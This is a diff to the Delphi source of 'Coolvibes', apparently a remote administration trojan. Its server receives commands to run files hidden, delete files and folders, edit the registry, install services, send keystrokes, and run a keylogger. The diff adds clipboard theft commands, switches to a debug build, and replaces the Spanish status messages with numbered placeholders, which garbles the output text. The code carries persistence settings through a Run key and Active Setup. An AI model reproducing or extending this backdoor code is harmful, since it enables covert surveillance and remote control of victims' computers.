@@ -12,8 +12,8 @@
 
      El equipo Coolvibes
 *)
-library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
-//program coolserver;  //Para debug, más lineas "Para debug" abajo
+//library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
+program coolserver;  //Para debug, más lineas "Para debug" abajo
 uses
   Windows,
   SysUtils,
@@ -262,7 +262,7 @@ const
             //Desinstalar server
             if TempStr = 'DESINSTALAR' then
             begin
-              SendText('MSG|De momento no funciona esta función :-)'+ENTER);
+              SendText('MSG|{0}'+ENTER);
               //Desinstalar();
             end;
 
@@ -273,7 +273,7 @@ const
                   PChar(ExtractFilePath(paramstr(0))), SW_NORMAL) > 32 then
                   ExitProcess(0)
                 else
-                  SendText('MSG|Hubo un problema al intentar auto-ejecutarse, la actualización se completara en el siguiente reinicio' + ENTER);
+                  SendText('MSG|{1}' + ENTER);
             end;
           end;
 
@@ -290,9 +290,9 @@ const
           begin
             Delete(Recibido, 1, 9);
             if TerminarProceso(Recibido) = True then
-              SendText('MSG|Proceso matado con PID ' + Recibido + ENTER)
+              SendText('MSG|{2}' + Recibido + ENTER)
             else
-              SendText('MSG| :( No pude matar el proceso con PID ' + Recibido + ENTER);
+              SendText('MSG|{3}' + Recibido + ENTER);
           end;
           //Fin de comandos relaccionados con los procesos
 
@@ -323,41 +323,41 @@ const
           begin
             Delete(Recibido, 1, 9);
             CerrarVentana(StrToInt(Recibido));
-            SendText('MSG|Ventana cerrada con Handle ' + Recibido + ENTER);
+            SendText('MSG|{4}' + Recibido + ENTER);
           end;
 
           if Copy(Recibido, 1, 6) = 'MAXWIN' then
           begin
             Delete(Recibido, 1, 7);
             MaximizarVentana(StrToInt(Recibido));
-            SendText('MSG|Ventana maximizada con Handle ' + Recibido + ENTER);
+            SendText('MSG|{5}' + Recibido + ENTER);
           end;
 
           if Copy(Recibido, 1, 6) = 'MINWIN' then
           begin
             Delete(Recibido, 1, 7);
             MinimizarVentana(StrToInt(Recibido));
-            SendText('MSG|Ventana minimizada con Handle ' + Recibido + ENTER);
+            SendText('MSG|{6}' + Recibido + ENTER);
           end;
 
           if Copy(Recibido, 1, 7) = 'SHOWWIN' then
           begin
             Delete(Recibido, 1, 8);
             MostrarVentana(StrToInt(Recibido));
-            SendText('MSG|Ventana mostrada con Handle ' + Recibido + ENTER);
+            SendText('MSG|{7}' + Recibido + ENTER);
           end;
 
           if Copy(Recibido, 1, 7) = 'HIDEWIN' then
           begin
             Delete(Recibido, 1, 8);
             OcultarVentana(StrToInt(Recibido));
-            SendText('MSG|Ventana ocultada con Handle ' + Recibido + ENTER);
+            SendText('MSG|{8}' + Recibido + ENTER);
           end;
 
           if Recibido = 'MINALLWIN' then
           begin
             MinimizarTodas();
-            SendText('MSG|Minimizadas todas las ventanas.' + ENTER);
+            SendText('MSG|{9}' + ENTER);
           end;
 
           if Copy(Recibido, 1, 11) = 'BOTONCERRAR' then
@@ -367,14 +367,14 @@ const
             begin
               Delete(Recibido, 1, 3); //Borra 'SI|' y queda el handle
               BotonCerrar(True, StrToInt(Recibido));
-              SendText('MSG|Se activó el botón Cerrar [X] en la ventana con Handle ' +
+              SendText('MSG|{10}' +
                 Recibido + ENTER);
             end
             else
             begin
               Delete(Recibido, 1, 3); //Borra 'NO|' y queda el handle
               BotonCerrar(False, StrToInt(Recibido));
-              SendText('MSG|Se desactivó el botón Cerrar [X] en la ventana con Handle ' +
+              SendText('MSG|{11}' +
                 Recibido + ENTER);
             end;
           end;
@@ -389,14 +389,14 @@ const
               i := StrToInt(TempStr)
             except
               begin
-                SendText('MSG|No se pudieron enviar las teclas a la ventana con handle ' +
+                SendText('MSG|{12}' +
                   TempStr + ENTER);
                 Exit;
               end;
             end;
             AppActivateHandle(i);
             SendKeys(PChar(Recibido), True);
-            SendText('MSG|Se enviaron las teclas a la ventana con handle ' + TempStr + ENTER);
+            SendText('MSG|{13}' + TempStr + ENTER);
           end;
           //Fin de comandos relacionados con las ventanas
 
@@ -516,13 +516,13 @@ const
                 //nunca debería pasar pero es mejor prevenir
             end;
             case BotonPulsado of
-              idOk: SendText('MSG|El usuario respondió: OK' + ENTER);
-              idCancel: SendText('MSG|El usuario respondió: Cancelar' + ENTER);
-              idRetry: SendText('MSG|El usuario respondió: Reintentar' + ENTER);
-              idYes: SendText('MSG|El usuario respondió: Sí' + ENTER);
-              idNo: SendText('MSG|El usuario respondió: No' + ENTER);
-              idAbort: SendText('MSG|El usuario respondió: Anular' + ENTER);
-              idIgnore: SendText('MSG|El usuario respondió: Omitir' + ENTER);
+              idOk: SendText('MSG|{14}' + ENTER);
+              idCancel: SendText('MSG|{15}' + ENTER);
+              idRetry: SendText('MSG|{16}' + ENTER);
+              idYes: SendText('MSG|{17}' + ENTER);
+              idNo: SendText('MSG|{18}' + ENTER);
+              idAbort: SendText('MSG|{19}' + ENTER);
+              idIgnore: SendText('MSG|{20}' + ENTER);
             end;
           end;
           //Fin de comandos relacionados con los Mensajes
@@ -562,9 +562,9 @@ const
               //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
               if ShellExecute(0, 'open', PChar(Recibido), ''{sin parametros},
                 PChar(ExtractFilePath(Recibido)), SW_NORMAL) > 32 then
-                SendText('MSG|Archivo correctamente ejecutado :).' + ENTER)
+                SendText('MSG|{21}' + ENTER)
               else
-                SendText('MSG|Se produjo algún error al ejecutar el archivo.' + ENTER);
+                SendText('MSG|{22}' + ENTER);
             end; //if copy = normal
             if Copy(Recibido, 1, 6) = 'OCULTO' then
             begin
@@ -573,9 +573,9 @@ const
               //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
               if ShellExecute(0, 'open', PChar(Recibido), ''{sin parametros},
                 PChar(ExtractFilePath(Recibido)), SW_HIDE) > 32 then
-                SendText('MSG|Archivo correctamente ejecutado de manera oculta :).' + ENTER)
+                SendText('MSG|{23}' + ENTER)
               else
-                SendText('MSG|Se produjo algún error al ejecutar el archivo de manera oculta.'
+                SendText('MSG|{24}'
                   + ENTER);
             end; //if copy = oculto
           end; //if copy = exec
@@ -587,12 +587,12 @@ const
             if FileExists(Recibido) then
             begin
               if BorrarArchivo(Recibido) = True then
-                SendText('MSG|El archivo fue borrado con éxito.' + ENTER)
+                SendText('MSG|{25}' + ENTER)
               else
-                SendText('MSG|El archivo no se pudo borrar.' + ENTER);
+                SendText('MSG|{26}' + ENTER);
             end
             else //el archivo no existe.... Se supone que nunca o muy pocas veces debería pasar.
-              SendText('MSG|El archivo no existe. Tal vez ya fue borrado.' + ENTER);
+              SendText('MSG|{27}' + ENTER);
 
           end;
 
@@ -603,12 +603,12 @@ const
             if DirectoryExists(Recibido) then
             begin
               if BorrarCarpeta(Recibido) = True then
-                SendText('MSG|La carpeta fue borrada con éxito.' + ENTER)
+                SendText('MSG|{28}' + ENTER)
               else
-                SendText('MSG|No se pudo borrar la carpeta.' + ENTER);
+                SendText('MSG|{29}' + ENTER);
             end
             else
-              SendText('MSG|La carpeta no existe. Tal vez ya fue borrada.' + ENTER);
+              SendText('MSG|{30}' + ENTER);
           end;
 
           //Renombrar archivos o carpetas
@@ -620,12 +620,12 @@ const
             if FileExists(TempStr) or DirectoryExists(TempStr) then
             begin
               if RenameFile(TempStr, Recibido) = True then
-                SendText('MSG|Archivo o carpeta renombrada con éxito.' + ENTER)
+                SendText('MSG|{31}' + ENTER)
               else
-                SendText('MSG|No se pudo renombrar el archivo o la carpeta.' + ENTER);
+                SendText('MSG|{32}' + ENTER);
             end
             else
-              SendText('MSG|El archivo o la carpeta no existe.' + ENTER);//el archivo no existe...
+              SendText('MSG|{33}' + ENTER);//el archivo no existe...
           end;
 
           //Crear carpeta
@@ -635,12 +635,12 @@ const
             if not DirectoryExists(Recibido) then
             begin
               if CreateDir(Recibido) = True then
-                SendText('MSG|Carpeta creada con éxito.' + ENTER)
+                SendText('MSG|{34}' + ENTER)
               else
-                SendText('MSG|No se pudo crear la carpeta.' + ENTER);
+                SendText('MSG|{35}' + ENTER);
             end
             else
-              SendText('MSG|La carpeta ya existe, no es necesario crearla.' + ENTER);
+              SendText('MSG|{36}' + ENTER);
             //Ya existe una carpeta con ese nombre
           end;
 
@@ -652,9 +652,9 @@ const
             Delete(Recibido, 1, Pos('|', Recibido));
             TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //a
             if copyfile(pchar(TempStr), pchar(TempStr1), false) then
-              SendText('MSG|Archivo copiado con éxito' + ENTER)
+              SendText('MSG|{37}' + ENTER)
             else
-              SendText('MSG|Error al copiar el archivo' + ENTER);
+              SendText('MSG|{38}' + ENTER);
           end;
 
           //Cambiar atributos
@@ -693,7 +693,7 @@ const
             else if Recibido = 'CURRENTDIR' then
               Recibido := extractfilepath(paramstr(0));
 
-            Sendtext('GORUTA|'+Recibido+'|');
+            Sendtext('GORUTA|'+Recibido+'|'+ENTER);
           end;
 
           //Fin de comandos relacionados con el FileManager
@@ -732,18 +732,18 @@ const
             //Conseguimos el nuevo nombre del valor
             TempStr2 := Copy(Recibido, 1, Length(Recibido));
             if RenombrarClave(PChar(TempStr), PChar(TempStr1), PChar(TempStr2)) then
-              SendText('MSG|Modificado nombre de clave con éxito.' + ENTER)
+              SendText('MSG|{39}' + ENTER)
             else
-              SendText('MSG|Error al modificar el nombre de la clave.' + ENTER);
+              SendText('MSG|{40}' + ENTER);
           end;
 
           if Copy(Recibido, 1, 14) = 'BORRARREGISTRO' then
           begin
             Delete(Recibido, 1, 15);
             if BorraClave(Recibido) then
-              SendText('MSG|Clave o Valor eliminado con éxito.' + ENTER)
+              SendText('MSG|{41}' + ENTER)
             else
-              SendText('MSG|No se pudo eliminar la clave o el valor.' + ENTER);
+              SendText('MSG|{42}' + ENTER);
           end;
 
           if Copy(Recibido, 1, 8) = 'NEWCLAVE' then
@@ -753,9 +753,9 @@ const
             Delete(Recibido, 1, Pos('|', Recibido));
             TempStr1 := Copy(Recibido, 1, Length(Recibido));  //Quitamos la última barra '\'
             if AniadirClave(TempStr + TempStr1, '', 'clave') then
-              SendText('MSG|Clave añadida con éxito.' + ENTER)
+              SendText('MSG|{43}' + ENTER)
             else
-              SendText('MSG|No se pudo añadir la clave.' + ENTER);
+              SendText('MSG|{44}' + ENTER);
           end;
 
           if Copy(Recibido, 1, 8) = 'ADDVALUE' then
@@ -766,9 +766,9 @@ const
             TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
             Delete(Recibido, 1, Pos('|', Recibido));
             if AniadirClave(TempStr, Copy(Recibido, 1, Length(Recibido)), TempStr1) then
-              SendText('MSG|Valor añadido con éxito.' + ENTER)
+              SendText('MSG|{45}' + ENTER)
             else
-              SendText('MSG|No se pudo añadir el valor.' + ENTER);
+              SendText('MSG|{46}' + ENTER);
           end;
           //Fin de comandos relacionados con el Registro
 
@@ -972,21 +972,21 @@ const
           begin
             Delete(Recibido, 1, 15);
             ServiceStatus(Recibido, True, True);
-            SendText('MSG|Se ha intentado iniciar el servicio' + ENTER);
+            SendText('MSG|{47}' + ENTER);
           end;
 
           if Pos('DETENERSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 15);
             ServiceStatus(Recibido, True, False);
-            SendText('MSG|Se ha intentado detener el servicio' + ENTER);
+            SendText('MSG|{48}' + ENTER);
           end;
 
           if Pos('BORRARSERVICIO', Recibido) = 1 then
           begin
             Delete(Recibido, 1, 14);
             ServicioBorrar(Recibido);
-            SendText('MSG|Se ha intentado desinstalar el servicio' + ENTER);
+            SendText('MSG|{49}' + ENTER);
           end;
 
           if Pos('INSTALARSERVICIO', Recibido) = 1 then
@@ -999,7 +999,7 @@ const
             TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
             //prueba//messageBox(0,pchar(tempstr+'|'+tempstr1+'|'+tempstr2),0,0);
             ServicioCrear(TempStr, TempStr1, TempStr2);
-            SendText('MSG|Se ha intentado instalar el servicio' + ENTER);
+            SendText('MSG|{50}' + ENTER);
           end;
 
           if Recibido = 'ESTADOKEYLOGGER' then //Informa al cliente sobre el estado del keylogger y del archivo del log
@@ -1021,7 +1021,7 @@ const
 
           if Pos('ELIMINARLOGKEYLOGGER', Recibido) = 1 then //eLiminar el log del keylogger
           begin
-             SendText('MSG|Log eliminado con éxito' + ENTER);
+             SendText('MSG|{51}' + ENTER);
              EliminarLog();
           end;
 
@@ -1030,12 +1030,12 @@ const
             Delete(Recibido, 1, 16);
             if(Copy(Recibido, 1, Pos('|', Recibido) - 1)='ACTIVAR') then
             begin
-              SendText('MSG|Online Keylogger activado con éxito' + ENTER);
+              SendText('MSG|{52}' + ENTER);
               SetOnlineKeylogger(true,sock);
             end
             else
             begin
-              SendText('MSG|Online Keylogger desactivado con éxito' + ENTER);
+              SendText('MSG|{53}' + ENTER);
               SetOnlineKeylogger(false,nil);
             end;
           end;
@@ -1054,13 +1054,27 @@ const
               0,
               ThreadSearch.ThreadId);
           end;
-          
+
           if Copy(Recibido, 1, 10) = 'STOPSEARCH' then
           begin
             StopSearch := true; //Se le manda al thread que finalice, él se encarga de informar al cliente si acabó
           end;
 
-          
+          // Clipboard (basado en el codigo de The Swash)
+          if Pos('GETCLIP', Recibido) = 1 then
+          begin
+            Delete(Recibido,1,7);
+            SendText('GETCLIP|' + GetClipBoardDatas + ENTER);
+          end;
+
+          if Pos('SETCLIP', Recibido) = 1 then
+          begin
+            Delete(Recibido,1,8);
+            SetClipBoardDatas( PChar(Recibido) );
+			      SendText('MSG|{54}' + ENTER);
+          end;
+
+
           lastCommandTime := getTickCount;
           Busy := False;
         end;//while sock.connected do
@@ -1091,7 +1105,7 @@ const
   procedure CargarServidor(P:Pointer);
   begin
     Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
-    
+
     BeginThread(nil,0,Addr(KeepAliveThread),nil,0,id1);
     OnServerInitKeylogger();  //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   
@@ -1106,7 +1120,8 @@ const
 
 begin
     //Para debug:
-    {Configuracion.sHosts   := 'localhost:3460¬';
+
+    Configuracion.sHosts   := 'localhost:3460¬';
     Configuracion.sID     := 'Coolserver';
     Configuracion.bCopiarArchivo := False; //Me copio o no?
     Configuracion.sFileNameToCopy := 'coolserver.exe';
@@ -1117,6 +1132,7 @@ begin
     Configuracion.sRunRegKeyName := 'Coolserver';
     Configuracion.bArranqueActiveSetup := False;
     Configuracion.sActiveSetupKeyName := 'blah-blah-blah-blah';
-    CargarServidor(@configuracion);       }
+    CargarServidor(@configuracion);
+    //
     //Fin de para debug
 end.
